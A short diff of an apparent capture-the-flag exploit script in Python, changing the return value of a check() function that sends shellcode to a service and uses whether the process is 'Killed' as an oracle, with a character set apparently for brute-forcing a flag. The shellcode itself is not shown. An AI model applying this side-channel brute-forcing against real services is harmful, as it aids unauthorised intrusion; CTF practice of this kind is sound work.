@@ -44,12 +44,12 @@ def check(io, idx, b):
     io.sendline(shellcode)
     data = io.recvuntil(b"Kill", timeout=0.5)
     if len(data) == 0: # local debug
-        return byte
+        return b
 
     if "Killed" in data: # remote
         return 0
     else:
-        return byte
+        return b
 
 
 visible_chars = string.ascii_letters + string.digits + '_{}='
